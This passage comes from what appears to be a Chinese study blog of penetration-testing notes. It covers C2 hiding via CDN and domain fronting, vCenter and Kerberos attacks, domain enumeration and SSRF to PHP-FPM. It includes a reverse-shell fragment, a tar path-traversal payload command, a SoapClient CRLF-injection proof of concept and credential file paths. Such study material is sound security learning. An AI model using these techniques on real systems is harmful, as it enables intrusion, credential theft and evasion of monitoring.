os-shell原理</h2><p>（实操也可以用fields）lines terminated by写php shell，一个用来上传，一个用来rce</p><ol><li>提高容错（被删掉后门）</li><li>绕过waf</li><li>错误隔离，方便调试</li><li>流量监控复杂化</li></ol><h2 id="域名收集"><a href="#域名收集" class="headerlink" title="域名收集"></a>域名收集</h2><p><strong>被动子域名收集的方式：</strong></p><ul><li>信息泄露（github）</li><li>搜索引擎</li><li>网络空间测绘引擎</li><li>证书透明（证书查询相关子域名）</li><li>使用公共数据集</li><li>第三方DNS服务（dns服务接口查询）</li><li>AS 号码查询（某个AS下所有域名）</li><li>SAN 收集（SSL&#x2F;TLS证书中的SAN字段）</li></ul><p><strong>主动收集子域名的方式：</strong></p><ul><li>字典枚举</li><li>置换扫描（根据命名模式生成字典）</li><li>域传送漏洞（主从DNS同步漏洞，请求获取所有子域名）</li><li>DNSSEC（验证DNS记录签名信息）</li><li>DNS缓存</li></ul><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p>手机</p><ul><li>绕过登录：万能密码，置空绕过，返回包中存在</li><li>其他逻辑洞：篡改内容为他人手机号，可复用验证码</li><li>服务器资源：可爆破（XFF头，加号 86 空格，并发，多个手机号）</li></ul><p>图形</p><ul><li>绕过登录：万能密码，置空绕过，返回包中存在</li><li>其他逻辑洞：可识别，可复用</li><li>服务器资源：长宽可控</li></ul><h2 id="域前置-CDN技术"><a href="#域前置-CDN技术" class="headerlink" title="域前置&#x2F;CDN技术"></a>域前置&#x2F;CDN技术</h2><p><a href="https://blog.csdn.net/qq_41874930/article/details/109008708">利用CDN、域前置、重定向三种技术隐藏C2的区别_域前置与cdn区别-CSDN博客</a></p><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>注册一个域名，将他的A记录解析到一个cloudflare域名（或者其他cdn平台）上，然后再把自己的域名再注册一个cdn服务</p><p>将自己的cdn的A记录解析，让他可以解析到C2的ip上，受害机的流量就只看得见cdn的ip了</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm">通过CDN隐藏了自己真实的<span class="hljs-built_in">ip</span><br>攻击者<span class="hljs-built_in">ip</span>--cdn节点--攻击者域名（可见）<br>需要一个不备案的域名 不限制https<br></code></pre></td></tr></table></figure><h3 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h3><p>同一个cdn下有两个域名，curl访问的时候取决于host头写的是哪个域名</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">通过CDN解析的特性（hosts头）来隐藏了<span class="hljs-built_in">ip</span>和域名（除非你想分析hosts头）<br>基于https 可以利用高信誉域名（前提是和自己的<span class="hljs-built_in">ip</span>在同个cdn下）<br></code></pre></td></tr></table></figure><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/1619186782_6082d45e9c3c5ec1d11fd.png!small" alt="CleanShot 2021-04-23 at 22.06.16@2x.png"></p><h2 id="vCenter渗透思路"><a href="#vCenter渗透思路" class="headerlink" title="vCenter渗透思路"></a>vCenter渗透思路</h2><p>1.查看版本：https :&#x2F;&#x2F;x.x.x.x&#x2F;sdk&#x2F;vimServiceVersions.xml 打cve拿webshell</p><p>2.寻找凭据后解密拿cookie</p><p>•Linux:<br>&#x2F;storage&#x2F;db&#x2F;vmware-vmdir&#x2F;data.mdb<br>•Windows<br>C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb</p><p>3.获取机器hash或者密码</p><p>生成快照-vol&#x2F;Vmss2core内存分析</p><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p>hadoop，FTP，LDAP，docker，Redis，Jboos，Jenkins..</p><h2 id="站库分离怎么打？"><a href="#站库分离怎么打？" class="headerlink" title="站库分离怎么打？"></a>站库分离怎么打？</h2><p>立足点是web的时候常规打，翻找数据库配置文件</p><p>对于数据库</p><p>select * from information_schema.PROCESSLIST; </p><p>定位web端ip load_file(mysql&lt;5.7)读文件</p><p>MSSQL：host_name()    @@servername确认站库分离 尝试RCE</p><h2 id="KDC服务器"><a href="#KDC服务器" class="headerlink" title="KDC服务器"></a>KDC服务器</h2><p>启动到88,464</p><ol><li><p>用户名爆破</p></li><li><p>密码喷洒和密码爆破</p></li><li><p>Kerberoasting（利用spn GetUserSPN）</p></li><li><p>ASRepRoasting（利用预认证后爆破凭据 GetNPUser）</p></li><li><p>黄金票据和白银票据</p></li><li><p>MS14-068</p></li><li><p>非约束委派、约束委派、基于资源的约束委派</p></li><li><p>票据传递（ptt&#x2F;ptk&#x2F;ptc）</p></li><li><p>mimikatz加密降级攻击(万能钥匙)</p></li><li><p>使用恶意的kerberos证书做权限维持</p></li></ol><h2 id="psexec原理"><a href="#psexec原理" class="headerlink" title="psexec原理"></a>psexec原理</h2><p>连接SMB共享后上传恶意服务文件到共享目录，打开SCM创建恶意服务连接管道</p><h2 id="frp有哪些流量特征，如何进行隐藏？"><a href="#frp有哪些流量特征，如何进行隐藏？" class="headerlink" title="frp有哪些流量特征，如何进行隐藏？"></a>frp有哪些流量特征，如何进行隐藏？</h2><p><a href="https://xie.infoq.cn/article/d6e190ea22c428a4e21b4f0d0">Frp流量隐匿对抗排查_内网渗透</a></p><p>如果没有做任何配置或者 <strong>tls_enable&#x3D;false</strong>，则 wireshark 抓取的流量就是纯明文的，很容易暴露</p><blockquote><p>frpc 在连接认证 frps 的时候，会进行三次握手，会把 frp 的版本信息发给 frps 进行认证，如果是用的一个没有改过的 Frp 那么这时候只要建立连接，很容易就会被安全设备捕获到</p></blockquote><p>打开 tls_enable 之后，流量就做了加密</p><blockquote><p>使用 tls_enable 加密后，首次连接会一个 <strong>0x17 的头部特征，并发送一个大小为 243 的数据包</strong></p></blockquote><h2 id="ubuntu定时任务弹shell失败"><a href="#ubuntu定时任务弹shell失败" class="headerlink" title="ubuntu定时任务弹shell失败"></a>ubuntu定时任务弹shell失败</h2><p>ubuntu的&#x2F;bin&#x2F;sh指向的是sh</p><p>重新改软连接，或者写成 bash -c “bash -i &gt;&amp; ……”</p><h2 id="⽇志被删除如何处理"><a href="#⽇志被删除如何处理" class="headerlink" title="⽇志被删除如何处理"></a>⽇志被删除如何处理</h2><p>将⽂件 &#x2F;proc&#x2F;544&#x2F;fd&#x2F;7 拷⻉到 &#x2F;var&#x2F;log&#x2F;messages </p><p>执⾏命令： cp &#x2F;proc&#x2F;544&#x2F;fd&#x2F;7 &#x2F;var&#x2F;log&#x2F;messages </p><p>重新启动 rsyslog 服务即可恢复被误删除的⽇志⽂件</p><h2 id="为什么-aspx-木马权限比-asp-大？"><a href="#为什么-aspx-木马权限比-asp-大？" class="headerlink" title="为什么 aspx 木马权限比 asp 大？"></a><strong>为什么 aspx 木马权限比 asp 大？</strong></h2><p>aspx 使用的是.net 技术。IIS 中默认不支持，ASP 只是脚本语言而已。</p><p>入侵的时候 asp 的木马一般是 guest 权限而 APSX 的木马一般是 users 权限。</p><h2 id="代码执行、文件读取、命令执行函数有哪些？"><a href="#代码执行、文件读取、命令执行函数有哪些？" class="headerlink" title="代码执行、文件读取、命令执行函数有哪些？"></a><strong>代码执行、文件读取、命令执行函数有哪些？</strong></h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>）代码执行：<br>eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function<br><br>Thread Timer ExecutorService <br><br><span class="hljs-number">2</span>）文件读取：<br><span class="hljs-function"><span class="hljs-title">file_get_contents</span><span class="hljs-params">()</span></span>,<span class="hljs-built_in">highlight_file</span>(),<span class="hljs-built_in">fopen</span>(),<span class="hljs-built_in">readfile</span>(),<span class="hljs-built_in">fread</span>(),<span class="hljs-built_in">fgetss</span>(),<span class="hljs-built_in">fgets</span>(),<span class="hljs-built_in">parse_ini_file</span>(),<span class="hljs-built_in">show_source</span>(),<span class="hljs-built_in">file</span>()等<br><br>Filereader BufferedReader FileInputStream BufferedStream <br><br><span class="hljs-number">3</span>)命令执行：<br><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span>, <span class="hljs-built_in">exec</span>(), <span class="hljs-built_in">shell_exec</span>(), <span class="hljs-built_in">passthru</span>() ,<span class="hljs-built_in">pcntl_exec</span>(),<span class="hljs-built_in">popen</span>(),<span class="hljs-built_in">proc_open</span>()<br><br>ProcessBuilder Runtime<br></code></pre></td></tr></table></figure><h2 id="提权为何选择可读写目录？不用带空格的目录？"><a href="#提权为何选择可读写目录？不用带空格的目录？" class="headerlink" title="提权为何选择可读写目录？不用带空格的目录？"></a><strong>提权为何选择可读写目录？不用带空格的目录？</strong></h2><p>因为 exp 执行多半需要空格界定参数</p><h2 id="token-和-refer-横向对比-谁安全等级高？"><a href="#token-和-refer-横向对比-谁安全等级高？" class="headerlink" title="token 和 refer 横向对比 谁安全等级高？"></a><strong>token 和 refer 横向对比 谁安全等级高？</strong></h2><p>token 安全等级更高</p><h2 id="内存马怎么手工排查，不用工具，怎么手动杀内存马"><a href="#内存马怎么手工排查，不用工具，怎么手动杀内存马" class="headerlink" title="内存马怎么手工排查，不用工具，怎么手动杀内存马"></a><strong>内存马怎么手工排查，不用工具，怎么手动杀内存马</strong></h2><p>内存马如何排查：如果发现了一些内存 webshell 的痕迹，需要有一个排查的思路来进行跟踪和分析，也是根据各类型的原理，<br>1、如果是 jsp 注入，日志中排查可以 jsp 的访问请求。<br>2、如果是代码执行漏洞，排查中间件的 error.log,查看是否有可疑的报错，判断注入时间和方法。<br>3、根据业务使用的组件排查可能存在的 java 代码执行漏洞，spring 的 controller 类型的话根据上报 webshell 的 url 查找日志，filter 或者 listener 类型，可能会有较多的 404 但是带有参数的请求。<br>杀马：<br>终止进程：如果确认某个进程是内存马，可以尝试终止该进程。在 Windows 系统中，可以通过任务管理器或者命令行工具 taskkill 来终止进程；在 Linux 系统中，可以通过命令行工具 kill 或者 pkill 来终止进程。<br>删除文件：如果进程终止后，还需要删除相关的文件，以防止内存马重新启动。在 Windows 系统中，可以直接删除相关文件；在 Linux 系统中，需要先终止进程，然后再删除文件。</p><h2 id="鱼叉和水坑"><a href="#鱼叉和水坑" class="headerlink" title="鱼叉和水坑"></a>鱼叉和水坑</h2><p>鱼叉攻击：指利用木马程序作为电子邮件的附件，发送到目标电脑上，诱导受害者去打开附件来感染木马</p><p>水坑攻击：分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，将网站攻破并植入恶意程序，等待目标访问</p><h2 id="企业安全"><a href="#企业安全" class="headerlink" title="企业安全"></a>企业安全</h2><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/YG16bcSjfo3kQmxRwypcYzSGnRe.png"></p><h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/VaXxbvwCJo7MKOxdskScW8lyn7d.png"></p><h2 id="IDS-IPS"><a href="#IDS-IPS" class="headerlink" title="IDS&#x2F;IPS"></a>IDS&#x2F;IPS</h2><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/JshRb4zXqoPfyZx0Y6wcjU8Fn9b.png"></p><ul><li><p>加密通道</p></li><li><p>混淆编码</p></li><li><p>分割攻击</p></li><li><p>流量模仿</p></li></ul><h2 id="票据"><a href="#票据" class="headerlink" title="票据"></a>票据</h2><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/WbcnbABAFoOopxxCnlrclP9LnWh.png"></p><h2 id="常见内网ip"><a href="#常见内网ip" class="headerlink" title="常见内网ip"></a>常见内网ip</h2><p>10.0.0.0&#x2F;8<br>10.0.0.0 - 10.255.255.255<br>172.16.0.0&#x2F;12<br>172.16.0.0 - 172.31.255.255<br>192.168.0.0&#x2F;16<br>192.168.0.0 - 192.168.255.255</p><h2 id="登录口"><a href="#登录口" class="headerlink" title="登录口"></a>登录口</h2><ul><li>注入点与万能密码</li><li>不安全用户提示</li><li>源代码</li><li>验证码</li><li>暴力破解</li><li>逻辑漏洞</li></ul><h2 id="windows登陆成功失败"><a href="#windows登陆成功失败" class="headerlink" title="windows登陆成功失败"></a>windows登陆成功失败</h2><p>4624（成功）&#x2F;4625</p><h2 id="查询域成员和对应机器"><a href="#查询域成员和对应机器" class="headerlink" title="查询域成员和对应机器"></a>查询域成员和对应机器</h2><p>利用userWorkstations或者组策略</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">adfind -sc u:micle userWorkstations<br>Invoke-EnumerateLocalAdmin<br></code></pre></td></tr></table></figure><h2 id="域内用户正在登陆的主机"><a href="#域内用户正在登陆的主机" class="headerlink" title="域内用户正在登陆的主机"></a>域内用户正在登陆的主机</h2><ul><li>利用NetSessionEnum（win32 API）来寻找登陆的网络会话，一般用来查域控。【任意用户都可以】</li><li>利用NetWkstaUserEnum（win32 API）列出当前登录到该机器的所有用户。【本地机器管理员】</li><li>查询远程机器注册表项里 HKEY_USERS，来查看谁正在登陆该机器。【机器开启远程注册表连接】</li></ul><h2 id="域信任关系"><a href="#域信任关系" class="headerlink" title="域信任关系"></a>域信任关系</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment">#查询域信任关系</span><br>nltest /domain_trusts<br><span class="hljs-comment">#查询当前域与test.local域的信任关系</span><br>Get-ADTrust -Identity test.local<br><br><span class="hljs-comment">#获取根域信息，可查看有哪些域</span><br>powershell [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()<br><span class="hljs-comment">#查看当前域信息</span><br>powershell [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br><span class="hljs-comment">#查看当前域信任关系</span><br>powershell ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()<br><span class="hljs-comment">#查看当前域全局编录地址（根域域控地址）</span><br>powershell [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GlobalCatalogs<br></code></pre></td></tr></table></figure><p>用户加入林外部域时，会出现在 <code>CN=ForeignSecurityPrincipals,DC=domain,DC=com</code> 组中。只要枚举 <code>ForeignSecurityPrincipals</code> 组，就可得知哪些用户具有这个外部森林的访问权限。</p><h2 id="域控端口"><a href="#域控端口" class="headerlink" title="域控端口"></a>域控端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Bash">Microsoft-DS traffic : 445/TCP 445/UDP<br><br>Kerberos : 88/TCP 88/UDP<br><br>LDAP ping : 389/UDP<br><br>DNS : 53/TCP 53/UDP<br><br>NetBIOS的相关服务 ： 137/TCP 137/UDP 138/UDP 139/UDP 开放这些连续的端口，以便于通过防火墙来使用NetBIOS服务，例如支持旧客户端来登录、浏览网上邻居等。<br></code></pre></td></tr></table></figure><h2 id="定位域管"><a href="#定位域管" class="headerlink" title="定位域管"></a>定位域管</h2><p>域管进程</p><ul><li>通过 net group “domain admins” &#x2F;domain 列出域管理员组成员</li><li>通过 tasklist &#x2F;v 列出本地进程的所有者</li><li>进行交叉处理，找到域管理进程</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain <span class="hljs-comment">// 查询域管理员用户组</span><br>net group <span class="hljs-string">&quot;enterprise admins&quot;</span> /domain <span class="hljs-comment">// 企业管理组</span><br>net localgroup administrators /domain <span class="hljs-comment">// 登录本机的域管理员</span><br>net localgroup administrators <span class="hljs-comment">// 本机管理员[通常含有域用户]</span><br></code></pre></td></tr></table></figure><p>psloggedon.exe</p><p>psloggedon.exe &#x2F;&#x2F;dc，通过检查注册表的HKEY USERS项的key值来查询谁登录过。</p><p>PVEFindADUser.exe（要管理员权限）</p><p>netview.exe（小部分要管理员权限）</p><p>利用 NetSessionEnum 来找寻登陆sessions, 利用NetShareEnum来找寻共享 , 利用 NetWkstaUserEnum 来枚举登陆的用户。调用Api太多不是个好事。</p><p><strong>PowerView 脚本</strong></p><p>Invoke-UserHunter：搜索本地域中域管理员当前在线的主机，并验证当前用户是否具有对这些主机的本地管理员访问权限。它可以使用 Get-NetSessions 和Get-NetLoggedon 扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，并且无需管理员权限。</p><h2 id="wmic-如何构造有回显的命令执行"><a href="#wmic-如何构造有回显的命令执行" class="headerlink" title="wmic 如何构造有回显的命令执行"></a>wmic 如何构造有回显的命令执行</h2><ul><li>执行完写文件再读。</li><li>impacket 工具包的 wmiexec 直接实现了回显。</li><li>wmicmd 是将执行后的结果插入了注册表，然后在读取注册表中的值来完成不依赖 445 的回显。</li></ul><h1 id="web-零散知识"><a href="#web-零散知识" class="headerlink" title="web 零散知识"></a>web 零散知识</h1><h2 id="SSRF-利用-fastcgi-攻击"><a href="#SSRF-利用-fastcgi-攻击" class="headerlink" title="SSRF 利用 fastcgi 攻击"></a>SSRF 利用 fastcgi 攻击</h2><p>之前做 ctf 题也运用过工具，但是不了解原理</p><blockquote><p><a href="https://blog.csdn.net/weixin_39664643/article/details/114977217">https://blog.csdn.net/weixin_39664643&#x2F;article&#x2F;details&#x2F;114977217</a></p></blockquote><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="CGI-FASTCGI-PHP-CGI-PHP-FPM"><a href="#CGI-FASTCGI-PHP-CGI-PHP-FPM" class="headerlink" title="CGI&#x2F;FASTCGI&#x2F;PHP-CGI&#x2F;PHP-FPM"></a>CGI&#x2F;FASTCGI&#x2F;PHP-CGI&#x2F;PHP-FPM</h4><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/MZZsbzpqxoYnIzxXzd1cPnIanHe.png"></p><blockquote><p>PHP-CGI 与 PHP-FPM 是一个<strong>接口程序</strong>，CGI&#x2F;FASTCGI 是服务器中间件与某个语言后端（如 PHP-FPM）之间的<strong>协议</strong>，可以将他们与客户端和服务器之间的 http 等协议做类比，网站服务器收到数据之后会根据<strong>是否是静态文件</strong>来决定需不需要给予 php 解析器来处理</p></blockquote><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/GqwUb9kLUoW4JUxEQAZcSLmqn5q.png"></p><h4 id="gopher-协议"><a href="#gopher-协议" class="headerlink" title="gopher 协议"></a>gopher 协议</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具<br></code></pre></td></tr></table></figure><h5 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">URL</span><span class="hljs-symbol">:gopher</span><span class="hljs-symbol">://&lt;host&gt;</span><span class="hljs-symbol">:&lt;port&gt;/&lt;gopher-path&gt;_</span>后接<span class="hljs-variable constant_">TCP</span>数据流<br></code></pre></td></tr></table></figure><h5 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h5><p>1.抓取一个 tcp 数据包</p><p>2.bp url 全编码</p><p>3.拼接格式</p><h4 id="FASTCGI-协议详解"><a href="#FASTCGI-协议详解" class="headerlink" title="FASTCGI 协议详解"></a>FASTCGI 协议详解</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端（PHP-FPM），语言后端（PHP-FPM）解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件<br></code></pre></td></tr></table></figure><p>结构如下，头固定八个字节，body 由头中的 contentLength 决定</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/ZUy4b98iaoLw1DxXSdHcA3lOnPf.png"></p><h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li>PHP 版本要高于 5.3.3，才能动态修改 PHP.INI 配置文件（题目环境已满足）</li><li>知道题目环境中的一个 PHP 文件的绝对路径</li><li>PHP-FPM 监听在本机 9000 端口（题目环境已满足）</li></ul><h4 id="FASTCGI-攻击-PHP-FPM"><a href="#FASTCGI-攻击-PHP-FPM" class="headerlink" title="FASTCGI 攻击 PHP-FPM"></a>FASTCGI 攻击 PHP-FPM</h4><blockquote><p>PHP-FPM 默认监听 9000 端口，如果这个端口暴露在公网，则我们可以自己构造 FastCGI 协议，和 FPM 进行通信。<br>我们可以自己构造 FASTCGI 数据包控制 SCRIPT_FILENAME 来让 PHP-FPM 执行任意文件</p></blockquote><p>利用方案</p><p>例子如下</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/NVUubeBtMoWJNGxtP3ocHzChnue.png"></p><h4 id="SSRF-攻击-PHP-FPM"><a href="#SSRF-攻击-PHP-FPM" class="headerlink" title="SSRF 攻击 PHP-FPM"></a>SSRF 攻击 PHP-FPM</h4><p>利用工具 gopherus 在 ssrf 利用点直接攻击即可，其原理同上</p><h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><p>一个是 PHP-FPM 直接暴露在外网会收到我们的攻击，</p><p>一个是在内网,需要 ssrf(gopher 协议)进一步利用</p><h2 id="php-源码泄露问题"><a href="#php-源码泄露问题" class="headerlink" title="php 源码泄露问题"></a>php 源码泄露问题</h2><p>PHP&lt;&#x3D;7.4.21 时通过 <code>php -S</code> 的 WEB 服务器存在源码泄露漏洞，可以将 PHP 文件作为静态文件直接输出源码</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/FbbPbLpz4oqm3DxlkuJc4zJVnUc.png"></p><h2 id="tar-解压目录穿越"><a href="#tar-解压目录穿越" class="headerlink" title="tar 解压目录穿越"></a>tar 解压目录穿越</h2><blockquote><p><a href="https://blog.csdn.net/wanmiqi/article/details/110202417">https://blog.csdn.net/wanmiqi/article/details/110202417</a></p></blockquote><p>在 python 或者 Unix 下，使用 tar 压缩的文件名如果存在目录穿越，那么解压后的文件也会造成穿越</p><p><strong>ar cPvf shell.tar ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;testupload&#x2F;payload.php</strong></p><h2 id="pickle-反序列化"><a href="#pickle-反序列化" class="headerlink" title="pickle 反序列化"></a>pickle 反序列化</h2><h2 id="yaml-反序列化"><a href="#yaml-反序列化" class="headerlink" title="yaml 反序列化"></a>yaml 反序列化</h2><h2 id="Phpsession-特性"><a href="#Phpsession-特性" class="headerlink" title="Phpsession 特性"></a>Phpsession 特性</h2><p><a href="https://juejin.cn/post/7079670019956670471">PHP session 反序列化漏洞原理解析 - 掘金 (juejin.cn)</a></p><ol><li>利用 session 上传文件（配合文件上传）</li><li>由于 php 序列化处理器的不同导致的反序列化</li></ol><h2 id="CRLF-注入"><a href="#CRLF-注入" class="headerlink" title="CRLF 注入"></a>CRLF 注入</h2><blockquote><p><a href="https://www.freebuf.com/column/202762.html">每日漏洞 | CRLF 注入 - FreeBuf 网络安全行业门户</a></p></blockquote><p>利用换行符和回车符导致注入 http 数据</p><h2 id="Nodejs-Ssrf-拆分攻击"><a href="#Nodejs-Ssrf-拆分攻击" class="headerlink" title="Nodejs Ssrf 拆分攻击"></a>Nodejs Ssrf 拆分攻击</h2><p>利用的是 nodejs 对于特殊字符的转换导致不能正常过滤掉控制字符&#x2F;r&#x2F;n 导致的 CRLF 注入</p><h2 id="Soap-ssrf"><a href="#Soap-ssrf" class="headerlink" title="Soap ssrf"></a>Soap ssrf</h2><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/HJfEbVnLWoVRcGx2g4Cc8j5nnYg.png"></p><p>结合 CRLF 注入：通过第二个参数控制 UA 间接可控制 content-type</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/80918004">SoapClient 反序列化 SSRF - 知乎 (zhihu.com)</a></p></blockquote><?php$target = 'http://127.0.0.1:5555/path';$post_string = 'data=something';$headers = array<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;X-Forwarded-For: 127.0.0.1&#x27;,<br><br>&#x27;Cookie: PHPSESSID=my_session&#x27;<br><br>);<br></code></pre></td></tr></table></figure>$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));$aaa = serialize($b);$aaa = str_replace('^^',"\r\n",$aaa);$aaa = str_replace('&','&',$aaa);echo $aaa;$c = unserialize($aaa);$c->not_exists_function();?><h2 id="Phar-反序列化"><a href="#Phar-反序列化" class="headerlink" title="Phar 反序列化"></a>Phar 反序列化</h2><p>同时存在文件上传和和一些触发 phar 协议的函数的时候可以强制触发反序列化</p><h2 id="自动注册类函数-spl-autoload-register"><a href="#自动注册类函数-spl-autoload-register" class="headerlink" title="自动注册类函数 spl_autoload_register"></a>自动注册类函数 spl_autoload_register</h2><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/ZOupbGWGUoZwV1x2DG5cXyTKnid.png"></p><p>假如可以上传.inc 文件，同时存在反序列化，则将 webshell 修改为 inc 文件上传，记录上传的文件名，将他作序列化之后输入到反序列化的地方即 getshell</p><h2 id="Docker-PHP-裸文件本地包含"><a href="#Docker-PHP-裸文件本地包含" class="headerlink" title="Docker PHP 裸文件本地包含"></a>Docker PHP 裸文件本地包含</h2><p>只有文件包含但是无法上传文件，则需要利用本地文件</p><ol><li>日志包含：由于 Docker 将日志文件重定向，包含权限不足</li><li>Phpinfo 与条件竞争</li></ol><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/L2tUbrdnyo9QiTxKJTMc06mhnLc.png"></p><p>我们需要获取文件名，同时需要条件竞争</p><ol><li>window 通配符</li><li>session.upload_progress</li><li>pearcmd.php<ol start="4"><li></li></ol></li></ol><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/SGwYbK3Z2o4dbSxgByrc8j45nif.png"></p><ol start="7"><li></li></ol><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/SXVHbCgTuoXT3VxASFscTQv6nb2.png"></p><h2 id="DNS-域传送漏洞"><a href="#DNS-域传送漏洞" class="headerlink" title="DNS 域传送漏洞"></a>DNS 域传送漏洞</h2><blockquote><p><a href="https://cloud.tencent.com/developer/article/1555532">https://cloud.tencent.com/developer/article/1555532</a></p></blockquote><p>DNS 备份服务器通过”域传送”从主服务器上复制数据，如果域传送被攻击者利用就会导致整个网络拓扑泄露，一般使用 privateDNS 防御（内外网分离），限制区域传送 ip 并且设置 TSIG key</p><p>利用：nslookup -type&#x3D;ns 域名</p><p>然后进入交互模式 ls 列出域名–&gt; 是否可以列出域</p><p>kali 下 dig 发送 axfr 请求，要求返回某个区域全部记录 dnsenum dnswalk 都可以</p><h2 id="未设置-spf-导致邮箱任意伪造"><a href="#未设置-spf-导致邮箱任意伪造" class="headerlink" title="未设置 spf 导致邮箱任意伪造"></a>未设置 spf 导致邮箱任意伪造</h2><blockquote><p><a href="https://www.cnblogs.com/wkzb/p/15401932.html">https://www.cnblogs.com/wkzb/p/15401932.html</a><br><a href="https://www.cnblogs.com/wkzb/p/15553178.html">https://www.cnblogs.com/wkzb/p/15553178.html</a><br><a href="https://mp.weixin.qq.com/s/tOOBZ1aC6SsjslCM70WKBQ">https://mp.weixin.qq.com/s/tOOBZ1aC6SsjslCM70WKBQ</a> 邮件伪造</p></blockquote><h3 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h3><p>Sender Policy Framework 简单来说就是通过修改 SPF 记录来导致邮件任意发送</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/Yz88bpKUBoiogBxG54WcIAA4n07.png"></p><h4 id="查看方式"><a href="#查看方式" class="headerlink" title="查看方式"></a>查看方式</h4><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/W8rubjDC8op8f7xYngNcAkgFn19.png"></p><h4 id="绕过-1"><a 